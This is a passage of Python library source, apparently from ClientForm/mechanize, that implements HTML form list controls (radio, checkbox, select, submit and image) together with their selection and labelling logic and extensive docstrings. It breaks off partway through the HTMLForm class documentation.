self.__dict__.update({\n            \"name\": attrs[\"value\"],\n            \"_labels\": label and [label] or [],\n            \"attrs\": attrs,\n            \"_control\": control,\n            \"disabled\": \"disabled\" in attrs,\n            \"_selected\": False,\n            \"id\": attrs.get(\"id\"),\n            \"_index\": index,\n            })\n        control.items.append(self)\n\n    def get_labels(self):\n        \"\"\"Return all labels (Label instances) for this item.\n\n        For items that represent radio buttons or checkboxes, if the item was\n        surrounded by a <label> tag, that will be the first label; all other\n        labels, connected by 'for' and 'id', are in the order that appear in\n        the HTML.\n\n        For items that represent select options, if the option had a label\n        attribute, that will be the first label.  If the option has contents\n        (text within the option tags) and it is not the same as the label\n        attribute (if any), that will be a label.  There is nothing in the\n        spec to my knowledge that makes an option with an id unable to be the\n        target of a label's for attribute, so those are included, if any, for\n        the sake of consistency and completeness.\n\n        \"\"\"\n        res = []\n        res.extend(self._labels)\n        if self.id:\n            res.extend(self._control._form._id_to_labels.get(self.id, ()))\n        return res\n\n    def __getattr__(self, name):\n        if name==\"selected\":\n            return self._selected\n        raise AttributeError(name)\n\n    def __setattr__(self, name, value):\n        if name == \"selected\":\n            self._control._set_selected_state(self, value)\n        elif name == \"disabled\":\n            self.__dict__[\"disabled\"] = bool(value)\n        else:\n            raise AttributeError(name)\n\n    def __str__(self):\n        res = self.name\n        if self.selected:\n            res = \"*\" + res\n        if self.disabled:\n            res = \"(%s)\" % res\n        return res\n\n    def __repr__(self):\n        # XXX appending the attrs without distinguishing them from name and id\n        # is silly\n        attrs = [(\"name\", self.name), (\"id\", self.id)]+self.attrs.items()\n        return \"<%s %s>\" % (\n            self.__class__.__name__,\n            \" \".join([\"%s=%r\" % (k, v) for k, v in attrs])\n            )\n\ndef disambiguate(items, nr, **kwds):\n    msgs = []\n    for key, value in kwds.items():\n        msgs.append(\"%s=%r\" % (key, value))\n    msg = \" \".join(msgs)\n    if not items:\n        raise ItemNotFoundError(msg)\n    if nr is None:\n        if len(items) > 1:\n            raise AmbiguityError(msg)\n        nr = 0\n    if len(items) <= nr:\n        raise ItemNotFoundError(msg)\n    return items[nr]\n\nclass ListControl(Control):\n    \"\"\"Control representing a sequence of items.\n\n    The value attribute of a ListControl represents the successful list items\n    in the control.  The successful list items are those that are selected and\n    not disabled.\n\n    ListControl implements both list controls that take a length-1 value\n    (single-selection) and those that take length >1 values\n    (multiple-selection).\n\n    ListControls accept sequence values only.  Some controls only accept\n    sequences of length 0 or 1 (RADIO, and single-selection SELECT).\n    In those cases, ItemCountError is raised if len(sequence) > 1.  CHECKBOXes\n    and multiple-selection SELECTs (those having the \"multiple\" HTML attribute)\n    accept sequences of any length.\n\n    Note the following mistake:\n\n    control.value = some_value\n    assert control.value == some_value    # not necessarily true\n\n    The reason for this is that the value attribute always gives the list items\n    in the order they were listed in the HTML.\n\n    ListControl items can also be referred to by their labels instead of names.\n    Use the label argument to .get(), and the .set_value_by_label(),\n    .get_value_by_label() methods.\n\n    Note that, rather confusingly, though SELECT controls are represented in\n    HTML by SELECT elements (which contain OPTION elements, representing\n    individual list items), CHECKBOXes and RADIOs are not represented by *any*\n    element.  Instead, those controls are represented by a collection of INPUT\n    elements.  For example, this is a SELECT control, named \"control1\":\n\n    <select name=\"control1\">\n     <option>foo</option>\n     <option value=\"1\">bar</option>\n    </select>\n\n    and this is a CHECKBOX control, named \"control2\":\n\n    <input type=\"checkbox\" name=\"control2\" value=\"foo\" id=\"cbe1\">\n    <input type=\"checkbox\" name=\"control2\" value=\"bar\" id=\"cbe2\">\n\n    The id attribute of a CHECKBOX or RADIO ListControl is always that of its\n    first element (for example, \"cbe1\" above).\n\n\n    Additional read-only public attribute: multiple.\n\n    \"\"\"\n\n    # ListControls are built up by the parser from their component items by\n    # creating one ListControl per item, consolidating them into a single\n    # master ListControl held by the HTMLForm:\n\n    # -User calls form.new_control(...)\n    # -Form creates Control, and calls control.add_to_form(self).\n    # -Control looks for a Control with the same name and type in the form,\n    #  and if it finds one, merges itself with that control by calling\n    #  control.merge_control(self).  The first Control added to the form, of\n    #  a particular name and type, is the only one that survives in the\n    #  form.\n    # -Form calls control.fixup for all its controls.  ListControls in the\n    #  form know they can now safely pick their default values.\n\n    # To create a ListControl without an HTMLForm, use:\n\n    # control.merge_control(new_control)\n\n    # (actually, it's much easier just to use ParseFile)\n\n    _label = None\n\n    def __init__(self, type, name, attrs={}, select_default=False,\n                 called_as_base_class=False, index=None):\n        \"\"\"\n        select_default: for RADIO and multiple-selection SELECT controls, pick\n         the first item as the default if no 'selected' HTML attribute is\n         present\n\n        \"\"\"\n        if not called_as_base_class:\n            raise NotImplementedError()\n\n        self.__dict__[\"type\"] = type.lower()\n        self.__dict__[\"name\"] = name\n        self._value = attrs.get(\"value\")\n        self.disabled = False\n        self.readonly = False\n        self.id = attrs.get(\"id\")\n        self._closed = False\n\n        # As Controls are merged in with .merge_control(), self.attrs will\n        # refer to each Control in turn -- always the most recently merged\n        # control.  Each merged-in Control instance corresponds to a single\n        # list item: see ListControl.__doc__.\n        self.items = []\n        self._form = None\n\n        self._select_default = select_default\n        self._clicked = False\n\n    def clear(self):\n        self.value = []\n\n    def is_of_kind(self, kind):\n        if kind  == \"list\":\n            return True\n        elif kind == \"multilist\":\n            return bool(self.multiple)\n        elif kind == \"singlelist\":\n            return not self.multiple\n        else:\n            return False\n\n    def get_items(self, name=None, label=None, id=None,\n                  exclude_disabled=False):\n        \"\"\"Return matching items by name or label.\n\n        For argument docs, see the docstring for .get()\n\n        \"\"\"\n        if name is not None and not isstringlike(name):\n            raise TypeError(\"item name must be string-like\")\n        if label is not None and not isstringlike(label):\n            raise TypeError(\"item label must be string-like\")\n        if id is not None and not isstringlike(id):\n            raise TypeError(\"item id must be string-like\")\n        items = []  # order is important\n        compat = self._form.backwards_compat\n        for o in self.items:\n            if exclude_disabled and o.disabled:\n                continue\n            if name is not None and o.name != name:\n                continue\n            if label is not None:\n                for l in o.get_labels():\n                    if ((compat and l.text == label) or\n                        (not compat and l.text.find(label) > -1)):\n                        break\n                else:\n                    continue\n            if id is not None and o.id != id:\n                continue\n            items.append(o)\n        return items\n\n    def get(self, name=None, label=None, id=None, nr=None,\n            exclude_disabled=False):\n        \"\"\"Return item by name or label, disambiguating if necessary with nr.\n\n        All arguments must be passed by name, with the exception of 'name',\n        which may be used as a positional argument.\n\n        If name is specified, then the item must have the indicated name.\n\n        If label is specified, then the item must have a label whose\n        whitespace-compressed, stripped, text substring-matches the indicated\n        label string (eg. label=\"please choose\" will match\n        \"  Do  please  choose an item \").\n\n        If id is specified, then the item must have the indicated id.\n\n        nr is an optional 0-based index of the items matching the query.\n\n        If nr is the default None value and more than item is found, raises\n        AmbiguityError (unless the HTMLForm instance's backwards_compat\n        attribute is true).\n\n        If no item is found, or if items are found but nr is specified and not\n        found, raises ItemNotFoundError.\n\n        Optionally excludes disabled items.\n\n        \"\"\"\n        if nr is None and self._form.backwards_compat:\n            nr = 0  # :-/\n        items = self.get_items(name, label, id, exclude_disabled)\n        return disambiguate(items, nr, name=name, label=label, id=id)\n\n    def _get(self, name, by_label=False, nr=None, exclude_disabled=False):\n        # strictly for use by deprecated methods\n        if by_label:\n            name, label = None, name\n        else:\n            name, label = name, None\n        return self.get(name, label, nr, exclude_disabled)\n\n    def toggle(self, name, by_label=False, nr=None):\n        \"\"\"Deprecated: given a name or label and optional disambiguating index\n        nr, toggle the matching item's selection.\n\n        Selecting items follows the behavior described in the docstring of the\n        'get' method.\n\n        if the item is disabled, or this control is disabled or readonly,\n        raise AttributeError.\n\n        \"\"\"\n        deprecation(\n            \"item = control.get(...); item.selected = not item.selected\")\n        o = self._get(name, by_label, nr)\n        self._set_selected_state(o, not o.selected)\n\n    def set(self, selected, name, by_label=False, nr=None):\n        \"\"\"Deprecated: given a name or label and optional disambiguating index\n        nr, set the matching item's selection to the bool value of selected.\n\n        Selecting items follows the behavior described in the docstring of the\n        'get' method.\n\n        if the item is disabled, or this control is disabled or readonly,\n        raise AttributeError.\n\n        \"\"\"\n        deprecation(\n            \"control.get(...).selected = <boolean>\")\n        self._set_selected_state(self._get(name, by_label, nr), selected)\n\n    def _set_selected_state(self, item, action):\n        # action:\n        # bool False: off\n        # bool True: on\n        if self.disabled:\n            raise AttributeError(\"control '%s' is disabled\" % self.name)\n        if self.readonly:\n            raise AttributeError(\"control '%s' is readonly\" % self.name)\n        action = bool(action)\n        compat = self._form.backwards_compat\n        if not compat and item.disabled:\n            raise AttributeError(\"item is disabled\")\n        else:\n            if compat and item.disabled and action:\n                raise AttributeError(\"item is disabled\")\n            if self.multiple:\n                item.__dict__[\"_selected\"] = action\n            else:\n                if not action:\n                    item.__dict__[\"_selected\"] = False\n                else:\n                    for o in self.items:\n                        o.__dict__[\"_selected\"] = False\n                    item.__dict__[\"_selected\"] = True\n\n    def toggle_single(self, by_label=None):\n        \"\"\"Deprecated: toggle the selection of the single item in this control.\n\n        Raises ItemCountError if the control does not contain only one item.\n\n        by_label argument is ignored, and included only for backwards\n        compatibility.\n\n        \"\"\"\n        deprecation(\n            \"control.items[0].selected = not control.items[0].selected\")\n        if len(self.items) != 1:\n            raise ItemCountError(\n                \"'%s' is not a single-item control\" % self.name)\n        item = self.items[0]\n        self._set_selected_state(item, not item.selected)\n\n    def set_single(self, selected, by_label=None):\n        \"\"\"Deprecated: set the selection of the single item in this control.\n\n        Raises ItemCountError if the control does not contain only one item.\n\n        by_label argument is ignored, and included only for backwards\n        compatibility.\n\n        \"\"\"\n        deprecation(\n            \"control.items[0].selected = <boolean>\")\n        if len(self.items) != 1:\n            raise ItemCountError(\n                \"'%s' is not a single-item control\" % self.name)\n        self._set_selected_state(self.items[0], selected)\n\n    def get_item_disabled(self, name, by_label=False, nr=None):\n        \"\"\"Get disabled state of named list item in a ListControl.\"\"\"\n        deprecation(\n            \"control.get(...).disabled\")\n        return self._get(name, by_label, nr).disabled\n\n    def set_item_disabled(self, disabled, name, by_label=False, nr=None):\n        \"\"\"Set disabled state of named list item in a ListControl.\n\n        disabled: boolean disabled state\n\n        \"\"\"\n        deprecation(\n            \"control.get(...).disabled = <boolean>\")\n        self._get(name, by_label, nr).disabled = disabled\n\n    def set_all_items_disabled(self, disabled):\n        \"\"\"Set disabled state of all list items in a ListControl.\n\n        disabled: boolean disabled state\n\n        \"\"\"\n        for o in self.items:\n            o.disabled = disabled\n\n    def get_item_attrs(self, name, by_label=False, nr=None):\n        \"\"\"Return dictionary of HTML attributes for a single ListControl item.\n\n        The HTML element types that describe list items are: OPTION for SELECT\n        controls, INPUT for the rest.  These elements have HTML attributes that\n        you may occasionally want to know about -- for example, the \"alt\" HTML\n        attribute gives a text string describing the item (graphical browsers\n        usually display this as a tooltip).\n\n        The returned dictionary maps HTML attribute names to values.  The names\n        and values are taken from the original HTML.\n\n        \"\"\"\n        deprecation(\n            \"control.get(...).attrs\")\n        return self._get(name, by_label, nr).attrs\n\n    def close_control(self):\n        self._closed = True\n\n    def add_to_form(self, form):\n        assert self._form is None or form == self._form, (\n            \"can't add control to more than one form\")\n        self._form = form\n        if self.name is None:\n            # always count nameless elements as separate controls\n            Control.add_to_form(self, form)\n        else:\n            for ii in xrange(len(form.controls)-1, -1, -1):\n                control = form.controls[ii]\n                if control.name == self.name and control.type == self.type:\n                    if control._closed:\n                        Control.add_to_form(self, form)\n                    else:\n                        control.merge_control(self)\n                    break\n            else:\n                Control.add_to_form(self, form)\n\n    def merge_control(self, control):\n        assert bool(control.multiple) == bool(self.multiple)\n        # usually, isinstance(control, self.__class__)\n        self.items.extend(control.items)\n\n    def fixup(self):\n        \"\"\"\n        ListControls are built up from component list items (which are also\n        ListControls) during parsing.  This method should be called after all\n        items have been added.  See ListControl.__doc__ for the reason this is\n        required.\n\n        \"\"\"\n        # Need to set default selection where no item was indicated as being\n        # selected by the HTML:\n\n        # CHECKBOX:\n        #  Nothing should be selected.\n        # SELECT/single, SELECT/multiple and RADIO:\n        #  RFC 1866 (HTML 2.0): says first item should be selected.\n        #  W3C HTML 4.01 Specification: says that client behaviour is\n        #   undefined in this case.  For RADIO, exactly one must be selected,\n        #   though which one is undefined.\n        #  Both Netscape and Microsoft Internet Explorer (IE) choose first\n        #   item for SELECT/single.  However, both IE5 and Mozilla (both 1.0\n        #   and Firebird 0.6) leave all items unselected for RADIO and\n        #   SELECT/multiple.\n\n        # Since both Netscape and IE all choose the first item for\n        # SELECT/single, we do the same.  OTOH, both Netscape and IE\n        # leave SELECT/multiple with nothing selected, in violation of RFC 1866\n        # (but not in violation of the W3C HTML 4 standard); the same is true\n        # of RADIO (which *is* in violation of the HTML 4 standard).  We follow\n        # RFC 1866 if the _select_default attribute is set, and Netscape and IE\n        # otherwise.  RFC 1866 and HTML 4 are always violated insofar as you\n        # can deselect all items in a RadioControl.\n\n        for o in self.items: \n            # set items' controls to self, now that we've merged\n            o.__dict__[\"_control\"] = self\n\n    def __getattr__(self, name):\n        if name == \"value\":\n            compat = self._form.backwards_compat\n            if self.name is None:\n                return []\n            return [o.name for o in self.items if o.selected and\n                    (not o.disabled or compat)]\n        else:\n            raise AttributeError(\"%s instance has no attribute '%s'\" %\n                                 (self.__class__.__name__, name))\n\n    def __setattr__(self, name, value):\n        if name == \"value\":\n            if self.disabled:\n                raise AttributeError(\"control '%s' is disabled\" % self.name)\n            if self.readonly:\n                raise AttributeError(\"control '%s' is readonly\" % self.name)\n            self._set_value(value)\n        elif name in (\"name\", \"type\", \"multiple\"):\n            raise AttributeError(\"%s attribute is readonly\" % name)\n        else:\n            self.__dict__[name] = value\n\n    def _set_value(self, value):\n        if value is None or isstringlike(value):\n            raise TypeError(\"ListControl, must set a sequence\")\n        if not value:\n            compat = self._form.backwards_compat\n            for o in self.items:\n                if not o.disabled or compat:\n                    o.selected = False\n        elif self.multiple:\n            self._multiple_set_value(value)\n        elif len(value) > 1:\n            raise ItemCountError(\n                \"single selection list, must set sequence of \"\n                \"length 0 or 1\")\n        else:\n            self._single_set_value(value)\n\n    def _get_items(self, name, target=1):\n        all_items = self.get_items(name)\n        items = [o for o in all_items if not o.disabled]\n        if len(items) < target:\n            if len(all_items) < target:\n                raise ItemNotFoundError(\n                    \"insufficient items with name %r\" % name)\n            else:\n                raise AttributeError(\n                    \"insufficient non-disabled items with name %s\" % name)\n        on = []\n        off = []\n        for o in items:\n            if o.selected:\n                on.append(o)\n            else:\n                off.append(o)\n        return on, off\n\n    def _single_set_value(self, value):\n        assert len(value) == 1\n        on, off = self._get_items(value[0])\n        assert len(on) <= 1\n        if not on:\n            off[0].selected = True\n\n    def _multiple_set_value(self, value):\n        compat = self._form.backwards_compat\n        turn_on = []  # transactional-ish\n        turn_off = [item for item in self.items if\n                    item.selected and (not item.disabled or compat)]\n        names = {}\n        for nn in value:\n            if nn in names.keys():\n                names[nn] += 1\n            else:\n                names[nn] = 1\n        for name, count in names.items():\n            on, off = self._get_items(name, count)\n            for i in xrange(count):\n                if on:\n                    item = on[0]\n                    del on[0]\n                    del turn_off[turn_off.index(item)]\n                else:\n                    item = off[0]\n                    del off[0]\n                    turn_on.append(item)\n        for item in turn_off:\n            item.selected = False\n        for item in turn_on:\n            item.selected = True\n\n    def set_value_by_label(self, value):\n        \"\"\"Set the value of control by item labels.\n\n        value is expected to be an iterable of strings that are substrings of\n        the item labels that should be selected.  Before substring matching is\n        performed, the original label text is whitespace-compressed\n        (consecutive whitespace characters are converted to a single space\n        character) and leading and trailing whitespace is stripped.  Ambiguous\n        labels are accepted without complaint if the form's backwards_compat is\n        True; otherwise, it will not complain as long as all ambiguous labels\n        share the same item name (e.g. OPTION value).\n\n        \"\"\"\n        if isstringlike(value):\n            raise TypeError(value)\n        if not self.multiple and len(value) > 1:\n            raise ItemCountError(\n                \"single selection list, must set sequence of \"\n                \"length 0 or 1\")\n        items = []\n        for nn in value:\n            found = self.get_items(label=nn)\n            if len(found) > 1:\n                if not self._form.backwards_compat:\n                    # ambiguous labels are fine as long as item names (e.g.\n                    # OPTION values) are same\n                    opt_name = found[0].name\n                    if [o for o in found[1:] if o.name != opt_name]:\n                        raise AmbiguityError(nn)\n                else:\n                    # OK, we'll guess :-(  Assume first available item.\n                    found = found[:1]\n            for o in found:\n                # For the multiple-item case, we could try to be smarter,\n                # saving them up and trying to resolve, but that's too much.\n                if self._form.backwards_compat or o not in items:\n                    items.append(o)\n                    break\n            else:  # all of them are used\n                raise ItemNotFoundError(nn)\n        # now we have all the items that should be on\n        # let's just turn everything off and then back on.\n        self.value = []\n        for o in items:\n            o.selected = True\n\n    def get_value_by_label(self):\n        \"\"\"Return the value of the control as given by normalized labels.\"\"\"\n        res = []\n        compat = self._form.backwards_compat\n        for o in self.items:\n            if (not o.disabled or compat) and o.selected:\n                for l in o.get_labels():\n                    if l.text:\n                        res.append(l.text)\n                        break\n                else:\n                    res.append(None)\n        return res\n\n    def possible_items(self, by_label=False):\n        \"\"\"Deprecated: return the names or labels of all possible items.\n\n        Includes disabled items, which may be misleading for some use cases.\n\n        \"\"\"\n        deprecation(\n            \"[item.name for item in self.items]\")\n        if by_label:\n            res = []\n            for o in self.items:\n                for l in o.get_labels():\n                    if l.text:\n                        res.append(l.text)\n                        break\n                else:\n                    res.append(None)\n            return res\n        return [o.name for o in self.items]\n\n    def _totally_ordered_pairs(self):\n        if self.disabled or self.name is None:\n            return []\n        else:\n            return [(o._index, self.name, o.name) for o in self.items\n                    if o.selected and not o.disabled]\n\n    def __str__(self):\n        name = self.name\n        if name is None: name = \"<None>\"\n\n        display = [str(o) for o in self.items]\n\n        infos = []\n        if self.disabled: infos.append(\"disabled\")\n        if self.readonly: infos.append(\"readonly\")\n        info = \", \".join(infos)\n        if info: info = \" (%s)\" % info\n\n        return \"<%s(%s=[%s])%s>\" % (self.__class__.__name__,\n                                    name, \", \".join(display), info)\n\n\nclass RadioControl(ListControl):\n    \"\"\"\n    Covers:\n\n    INPUT/RADIO\n\n    \"\"\"\n    def __init__(self, type, name, attrs, select_default=False, index=None):\n        attrs.setdefault(\"value\", \"on\")\n        ListControl.__init__(self, type, name, attrs, select_default,\n                             called_as_base_class=True, index=index)\n        self.__dict__[\"multiple\"] = False\n        o = Item(self, attrs, index)\n        o.__dict__[\"_selected\"] = \"checked\" in attrs\n\n    def fixup(self):\n        ListControl.fixup(self)\n        found = [o for o in self.items if o.selected and not o.disabled]\n        if not found:\n            if self._select_default:\n                for o in self.items:\n                    if not o.disabled:\n                        o.selected = True\n                        break\n        else:\n            # Ensure only one item selected.  Choose the last one,\n            # following IE and Firefox.\n            for o in found[:-1]:\n                o.selected = False\n\n    def get_labels(self):\n        return []\n\nclass CheckboxControl(ListControl):\n    \"\"\"\n    Covers:\n\n    INPUT/CHECKBOX\n\n    \"\"\"\n    def __init__(self, type, name, attrs, select_default=False, index=None):\n        attrs.setdefault(\"value\", \"on\")\n        ListControl.__init__(self, type, name, attrs, select_default,\n                             called_as_base_class=True, index=index)\n        self.__dict__[\"multiple\"] = True\n        o = Item(self, attrs, index)\n        o.__dict__[\"_selected\"] = \"checked\" in attrs\n\n    def get_labels(self):\n        return []\n\n\nclass SelectControl(ListControl):\n    \"\"\"\n    Covers:\n\n    SELECT (and OPTION)\n\n\n    OPTION 'values', in HTML parlance, are Item 'names' in ClientForm parlance.\n\n    SELECT control values and labels are subject to some messy defaulting\n    rules.  For example, if the HTML representation of the control is:\n\n    <SELECT name=year>\n      <OPTION value=0 label=\"2002\">current year</OPTION>\n      <OPTION value=1>2001</OPTION>\n      <OPTION>2000</OPTION>\n    </SELECT>\n\n    The items, in order, have labels \"2002\", \"2001\" and \"2000\", whereas their\n    names (the OPTION values) are \"0\", \"1\" and \"2000\" respectively.  Note that\n    the value of the last OPTION in this example defaults to its contents, as\n    specified by RFC 1866, as do the labels of the second and third OPTIONs.\n\n    The OPTION labels are sometimes more meaningful than the OPTION values,\n    which can make for more maintainable code.\n\n    Additional read-only public attribute: attrs\n\n    The attrs attribute is a dictionary of the original HTML attributes of the\n    SELECT element.  Other ListControls do not have this attribute, because in\n    other cases the control as a whole does not correspond to any single HTML\n    element.  control.get(...).attrs may be used as usual to get at the HTML\n    attributes of the HTML elements corresponding to individual list items (for\n    SELECT controls, these are OPTION elements).\n\n    Another special case is that the Item.attrs dictionaries have a special key\n    \"contents\" which does not correspond to any real HTML attribute, but rather\n    contains the contents of the OPTION element:\n\n    <OPTION>this bit</OPTION>\n\n    \"\"\"\n    # HTML attributes here are treated slightly differently from other list\n    # controls:\n    # -The SELECT HTML attributes dictionary is stuffed into the OPTION\n    #  HTML attributes dictionary under the \"__select\" key.\n    # -The content of each OPTION element is stored under the special\n    #  \"contents\" key of the dictionary.\n    # After all this, the dictionary is passed to the SelectControl constructor\n    # as the attrs argument, as usual.  However:\n    # -The first SelectControl constructed when building up a SELECT control\n    #  has a constructor attrs argument containing only the __select key -- so\n    #  this SelectControl represents an empty SELECT control.\n    # -Subsequent SelectControls have both OPTION HTML-attribute in attrs and\n    #  the __select dictionary containing the SELECT HTML-attributes.\n\n    def __init__(self, type, name, attrs, select_default=False, index=None):\n        # fish out the SELECT HTML attributes from the OPTION HTML attributes\n        # dictionary\n        self.attrs = attrs[\"__select\"].copy()\n        self.__dict__[\"_label\"] = _get_label(self.attrs)\n        self.__dict__[\"id\"] = self.attrs.get(\"id\")\n        self.__dict__[\"multiple\"] = \"multiple\" in self.attrs\n        # the majority of the contents, label, and value dance already happened\n        contents = attrs.get(\"contents\")\n        attrs = attrs.copy()\n        del attrs[\"__select\"]\n\n        ListControl.__init__(self, type, name, self.attrs, select_default,\n                             called_as_base_class=True, index=index)\n        self.disabled = \"disabled\" in self.attrs\n        self.readonly = \"readonly\" in self.attrs\n        if \"value\" in attrs:\n            # otherwise it is a marker 'select started' token\n            o = Item(self, attrs, index)\n            o.__dict__[\"_selected\"] = \"selected\" in attrs\n            # add 'label' label and contents label, if different.  If both are\n            # provided, the 'label' label is used for display in HTML \n            # 4.0-compliant browsers (and any lower spec? not sure) while the\n            # contents are used for display in older or less-compliant\n            # browsers.  We make label objects for both, if the values are\n            # different.\n            label = attrs.get(\"label\")\n            if label:\n                o._labels.append(Label({\"__text\": label}))\n                if contents and contents != label:\n                    o._labels.append(Label({\"__text\": contents}))\n            elif contents:\n                o._labels.append(Label({\"__text\": contents}))\n\n    def fixup(self):\n        ListControl.fixup(self)\n        # Firefox doesn't exclude disabled items from those considered here\n        # (i.e. from 'found', for both branches of the if below).  Note that\n        # IE6 doesn't support the disabled attribute on OPTIONs at all.\n        found = [o for o in self.items if o.selected]\n        if not found:\n            if not self.multiple or self._select_default:\n                for o in self.items:\n                    if not o.disabled:\n                        was_disabled = self.disabled\n                        self.disabled = False\n                        try:\n                            o.selected = True\n                        finally:\n                            o.disabled = was_disabled\n                        break\n        elif not self.multiple:\n            # Ensure only one item selected.  Choose the last one,\n            # following IE and Firefox.\n            for o in found[:-1]:\n                o.selected = False\n\n\n#---------------------------------------------------\nclass SubmitControl(ScalarControl):\n    \"\"\"\n    Covers:\n\n    INPUT/SUBMIT\n    BUTTON/SUBMIT\n\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        ScalarControl.__init__(self, type, name, attrs, index)\n        # IE5 defaults SUBMIT value to \"Submit Query\"; Firebird 0.6 leaves it\n        # blank, Konqueror 3.1 defaults to \"Submit\".  HTML spec. doesn't seem\n        # to define this.\n        if self.value is None and not self.disabled and not self.readonly: self.value = \"\"\n        self.readonly = True\n\n    def get_labels(self):\n        res = []\n        if self.value:\n            res.append(Label({\"__text\": self.value}))\n        res.extend(ScalarControl.get_labels(self))\n        return res\n\n    def is_of_kind(self, kind): return kind == \"clickable\"\n\n    def _click(self, form, coord, return_type, request_class=_urllib.request.Request):\n        self._clicked = coord\n        r = form._switch_click(return_type, request_class)\n        self._clicked = False\n        return r\n\n    def _totally_ordered_pairs(self):\n        if not self._clicked:\n            return []\n        return ScalarControl._totally_ordered_pairs(self)\n\n\n#---------------------------------------------------\nclass ImageControl(SubmitControl):\n    \"\"\"\n    Covers:\n\n    INPUT/IMAGE\n\n    Coordinates are specified using one of the HTMLForm.click* methods.\n\n    \"\"\"\n    def __init__(self, type, name, attrs, index=None):\n        SubmitControl.__init__(self, type, name, attrs, index)\n        self.readonly = False\n\n    def _totally_ordered_pairs(self):\n        clicked = self._clicked\n        if self.disabled or not clicked:\n            return []\n        name = self.name\n        if name is None: return []\n        pairs = [\n            (self._index, \"%s.x\" % name, str(clicked[0])),\n            (self._index+1, \"%s.y\" % name, str(clicked[1])),\n            ]\n        value = self._value\n        if value:\n            pairs.append((self._index+2, name, value))\n        return pairs\n\n    get_labels = ScalarControl.get_labels\n\n# aliases, just to make str(control) and str(form) clearer\nclass PasswordControl(TextControl): pass\nclass HiddenControl(TextControl): pass\nclass TextareaControl(TextControl): pass\nclass SubmitButtonControl(SubmitControl): pass\n\n\ndef is_listcontrol(control): return control.is_of_kind(\"list\")\n\n\nclass HTMLForm:\n    \"\"\"Represents a single HTML <form> ... </form> element.\n\n    A form consists of a sequence of controls that usually have names, and\n    which can take on various values.  The values of the various types of\n    controls represent variously: text, zero-or-one-of-many or many-of-many\n    choices, and files to be uploaded.  Some controls can be clicked on to\n    submit the form, and clickable controls' values sometimes include the\n    coordinates of the click.\n\n    Forms can be filled in with data to be returned to the server, and then\n    submitted, using the click method to generate a request object suitable for\n    passing to urllib2.urlopen (or the click_request_data or click_pairs\n    methods if you're not using urllib2).\n\n    import ClientForm\n    forms = ClientForm.ParseFile(html, base_uri)\n    form = forms[0]\n\n    form[\"query\"] = \"Python\"\n    form.find_control(\"nr_results\").get(\"lots\").selected = True\n\n    response = urllib2.urlopen(form.click())\n\n    Usually, HTMLForm instances are not created directly.  Instead, the\n    ParseFile or ParseResponse factory functions are used.  If you do construct\n    HTMLForm objects yourself, however, note that an HTMLForm instance is only\n    properly initialised after the fixup method has been called (ParseFile and\n    ParseResponse do this for you).  See ListControl.__doc__ for the reason\n    this is required.\n\n    Indexing a form (form[\"control_name\"]) returns the named Control's value\n    attribute.  Assignment to a form index (form[\"control_name\"] = something)\n    is equivalent to assignment to the named Control's value attribute.  If you\n    need to be more specific than just supplying the control's name, use the\n    set_value and get_value methods.\n\n    ListControl values are lists of item names (specifically, the names of the\n    items that are selected and not disabled, and hence are \"successful\" -- ie.\n    cause data to be returned to the server).  The list item's name is the\n    value of the corresponding HTML element's\"value\" attribute.\n\n    Example:\n\n      <INPUT type=\"CHECKBOX\" name=\"cheeses\" value=\"leicester\"></INPUT>\n      <INPUT type=\"CHECKBOX\" name=\"cheeses\" value=\"cheddar\"></INPUT>\n\n    defines a CHECKBOX control with name \"cheeses\" which has two items, named\n    \"leicester\" and \"cheddar\".\n\n    Another example:\n\n      <SELECT name=\"more_cheeses\">\n        <OPTION>1</OPTION>\n        <OPTION value=\"2\" label=\"CHEDDAR\">cheddar</OPTION>\n      </SELECT>\n\n    defines a SELECT control with name \"more_cheeses\" which has two items,\n    named \"1\" and \"2\" (because the OPTION element's value HTML attribute\n    defaults to the element contents -- see SelectControl.__doc__ for more on\n    these defaulting rules).\n\n    To select, deselect or otherwise manipulate individual list items, use the\n    HTMLForm.find_control() and ListControl.get() methods.  To set the whole\n    value, do as for any other control: use indexing or the set_/get_value\n    methods.\n\n    Example:\n\n    # select *only* the item named \"cheddar\"\n    form[\"cheeses\"] = [\"cheddar\"]\n    # select \"cheddar\", leave other items unaffected\n    form.find_control(\"cheeses\").get(\"cheddar\").selected = True\n\n    Some controls (RADIO and SELECT without the multiple attribute) can only\n    have zero or one items selected at a time.  Some controls (CHECKBOX and\n    SELECT with the multiple attribute) can have multiple items selected at a\n    time.  To set the whole value of a ListControl, assign a sequence to a form\n    index:\n\n    form[\"cheeses\"] = [\"cheddar\", \"leicester\"]\n\n    If the ListControl is not multiple-selection, the assigned list must be of\n    length one.\n\n    To check if a control has an item, if an item is selected, or if an item is\n    successful (selected and not disabled), respectively:\n\n    \"cheddar\" in [item.name for item in form.find_control(\"cheeses\").items]\n    \"cheddar\" in [item.name for item in form.find_control(\"cheeses\").items and\n                  item.selected]\n    \"cheddar\" in form[\"cheeses\"]  # (or \"cheddar\" in form.get_value(\"cheeses\"))\n\n    Note that some list items may be disabled (see below).\n\n    Note the following mistake:\n\n    form[control_name] = control_value\n    assert form[control_name] == control_value  # not necessarily true\n\n    The reason for this is that form[control_name] always gives the list items\n    in the order they were listed in the HTML.\n\n    List items (hence list values, too) can be referred to in terms of list\n    item labels rather than list item names using the appropriate label\n    arguments.  Note that each item may have several labels.\n\n    The question of default values of OPTION contents, labels and values is\n    somewhat complicated: see SelectControl.__doc__ and\n    ListControl.get_item_attrs.__doc__ if you think you need to know.\n\n    Controls can be disabled or readonly.  In either case, the control's value\n    cannot be changed until you clear those flags (see example below).\n    Disabled is the state typically represented by browsers by 'greying out' a\n    control.  Disabled controls are not 'successful' -- they don't cause data\n    to get returned to the server.  Readonly controls usually appear in\n    browsers as read-only text boxes.  Readonly controls are successful.  List\n    items can also be disabled.  Attempts to select or deselect disabled items\n    fail with AttributeError.\n\n    If a lot of controls are readonly, it can be useful to do this:\n\n    form.set_all_readonly(False)\n\n    To clear a control's value attribute, so that it is not successful (until a\n    value is subsequently set):\n\n    form.clear(\"cheeses\")\n\n    More examples:\n\n    control = form.find_control(\"cheeses\")\n    control.disabled = False\n    control.readonly = False\n    control.get(\"gruyere\").disabled = True\n    control.items[0].selected = True\n\n    See the various Control classes for further documentation.  Many methods\n    take name, type, kind, id, label and nr arguments to specify the control to\n    be operated on: see HTMLForm.find_control.__doc__.\n\n    ControlNotFoundError (subclass of ValueError) is raised if the specified\n    control can't be found.  This includes occasions where a non-ListControl\n    is found, but the method (set, for example) requires a ListControl.\n    ItemNotFoundError 